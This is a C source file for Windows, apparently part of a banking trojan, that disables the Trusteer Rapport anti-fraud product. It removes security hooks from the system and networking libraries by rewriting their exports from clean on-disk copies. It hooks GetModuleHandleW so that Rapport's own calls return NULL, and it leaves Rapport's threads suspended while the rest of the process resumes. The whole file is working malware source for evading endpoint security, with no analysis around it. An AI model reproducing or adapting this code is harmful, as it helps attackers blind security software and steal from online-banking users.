#include <windows.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include "ntdll.h"

#include "utilsu.h"
#include "antirapport.h"
#include "splice.h"

typedef HMODULE (WINAPI *funcGetModuleHandleW)(LPWSTR lpModuleName);
BYTE g_OldGetModuleHandleWBytes[OLD_BYTES_SIZE] = {0};
funcGetModuleHandleW g_OldGetModuleHandleW = (funcGetModuleHandleW)&g_OldGetModuleHandleWBytes;

BOOL AntiRapCheckAddress(PVOID pvAddress)
{
	PLDR_DATA_TABLE_ENTRY pLdrEntry;

	if (NT_SUCCESS(LdrFindEntryForAddress(pvAddress, &pLdrEntry)))
	{
		if (StrStrIW(pLdrEntry->BaseDllName.Buffer, L"rapport"))
		{
			return FALSE;
		}
	}

	return TRUE;
}

HMODULE WINAPI NewGetModuleHandleW(LPWSTR lpModuleName)
{
	PVOID pvCallersAddress;
	PVOID pvCallersCaller;

	RtlGetCallersAddress(&pvCallersAddress, &pvCallersCaller);

	BOOL bPass = AntiRapCheckAddress(pvCallersAddress) || AntiRapCheckAddress(pvCallersCaller);

	if (bPass) return g_OldGetModuleHandleW(lpModuleName); else return NULL;
}

HMODULE MyGetModuleBase(LPCSTR lpDll)
{
	HMODULE hDll = GetModuleHandle(lpDll);

	return hDll ? hDll : LoadLibrary(lpDll);
}

PVOID MapBinary(LPCTSTR Path)
{
	LPVOID Map = NULL;
	HANDLE hMapping;
	HANDLE hFile;

	hFile = CreateFile(Path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		hMapping = CreateFileMapping(hFile, 0, PAGE_READONLY|SEC_IMAGE, 0, 0, 0);
		if (hMapping != INVALID_HANDLE_VALUE)
		{
			Map = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

			CloseHandle(hMapping);
		}

		CloseHandle(hFile);
	}

	return Map;
}

VOID UnhookModuleExports(HMODULE hModule)
{
	CHAR szModuleFileName[MAX_PATH];

	GetModuleFileName(hModule, szModuleFileName, sizeof(szModuleFileName));
	PVOID pMap = MapBinary(szModuleFileName);
	if (pMap)
	{
		PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)RtlImageNtHeader(hModule);
		if (pNtHeaders)
		{
			DWORD dwExportsSize;
			PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)RtlImageDirectoryEntryToData((PVOID)hModule, TRUE, IMAGE_DIRECTORY_ENTRY_EXPORT, &dwExportsSize);
			if (ExportDirectory && dwExportsSize)
			{
				PUSHORT Ords = (PUSHORT)((DWORD)hModule + ExportDirectory->AddressOfNameOrdinals);
				PULONG EntriesRva = (PULONG)((DWORD)hModule + ExportDirectory->AddressOfFunctions);
				PULONG Names = (PULONG)((DWORD)hModule + ExportDirectory->AddressOfNames);

				for (ULONG cEntry = 0; cEntry < ExportDirectory->NumberOfNames; cEntry++)
				{
					ULONG StartSize = 10;
					PVOID ApiStart = (PVOID)((DWORD)hModule + EntriesRva[Ords[cEntry]]);
					PVOID ApiOriginalStart = (PVOID)((DWORD)pMap + EntriesRva[Ords[cEntry]]);

					if (memcmp(ApiStart, ApiOriginalStart, StartSize))
					{
						BOOL bRestore = TRUE;

						UtiDPrint("Hook found %s - %08x - %s ...", PathFindFileNameA(szModuleFileName), ApiStart, ((DWORD_PTR)hModule + Names[cEntry]));

						if (!strcmp((PCHAR)((DWORD_PTR)hModule+Names[cEntry]), "InternetGetCookieExA") || !strcmp((PCHAR)((DWORD_PTR)hModule+Names[cEntry]), "InternetGetCookieA"))
						{
							UtiDPrint("Skipped.\n");
							bRestore = FALSE;
						}

						if (*(BYTE*)ApiStart == 0xE9)
						{
							PVOID Handler = (PVOID)(*(DWORD*)((DWORD)ApiStart + 1) + (DWORD)ApiStart + 5);
							CHAR FileName[MAX_PATH];

							if (GetMappedFileName(NtCurrentProcess(), Handler, FileName, RTL_NUMBER_OF(FileName)-1))
							{
								if (!_stricmp(PathFindFileNameA(FileName), "ieframe.dll"))
								{
									UtiDPrint("Not restored.\n");
									bRestore = FALSE;
								}
							}
						}

						if (bRestore)
						{
							ULONG Written;

							if (WriteProcessMemory(GetCurrentProcess(), ApiStart, ApiOriginalStart, StartSize, &Written))
							{
								UtiDPrint("Restored.\n");
							}
							else
							{
								UtiDPrint(__FUNCTION__"(): WriteProcessMemory failed with error %lx\n", GetLastError());
							}
						}
					}
				}
			}
		}

		UnmapViewOfFile(pMap);
	}
}

VOID UnhookLibs()
{
	UnhookModuleExports(MyGetModuleBase("ntdll"));
	UnhookModuleExports(MyGetModuleBase("kernel32"));
	UnhookModuleExports(MyGetModuleBase("mswsock"));
	UnhookModuleExports(MyGetModuleBase("ws2_32"));
	UnhookModuleExports(MyGetModuleBase("wsock32"));
	UnhookModuleExports(MyGetModuleBase("wininet"));
	if (!GetModuleHandle("ieframe.dll")) UnhookModuleExports(MyGetModuleBase("user32.dll"));
	UnhookModuleExports(MyGetModuleBase("gdi32.dll"));
}

BOOL AntiRapControlThreads(HANDLE hProcess, DWORD dwPid)
{
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnap == INVALID_HANDLE_VALUE) return FALSE;

	HANDLE hThread;
	THREADENTRY32 thread = {0};
	thread.dwSize = sizeof(THREADENTRY32);

	if (Thread32First(hSnap, &thread))
	{
		do 
		{
			if (thread.th32OwnerProcessID == dwPid && thread.th32ThreadID != GetCurrentThreadId())
			{
				if (hThread = OpenThread(THREAD_SUSPEND_RESUME|THREAD_QUERY_INFORMATION, 0, thread.th32ThreadID))
				{
					CHAR chFileName[MAX_PATH];
					PVOID pvStartAddress;
					DWORD dwLen;

					if (NT_SUCCESS(NtQueryInformationThread(hThread, ThreadQuerySetWin32StartAddress, &pvStartAddress, sizeof(PVOID), &dwLen)))
					{
						if (GetMappedFileName(hProcess, pvStartAddress, chFileName, RTL_NUMBER_OF(chFileName)-1))
						{
							if (!StrStrI(chFileName, "rapport"))
							{
								ResumeThread(hThread);
							}
						}
					}

					CloseHandle(hThread);
				}
			}
		} 
		while (Thread32Next(hSnap, &thread));
	}

	CloseHandle(hSnap);

	return TRUE;
}

VOID AntiRapStart()
{
	UnhookLibs();
	Splice(GetProcAddress(GetModuleHandle("kernel32.dll"), "GetModuleHandleW"), NewGetModuleHandleW, &g_OldGetModuleHandleWBytes);
	NtResumeProcess(NtCurrentProcess());
}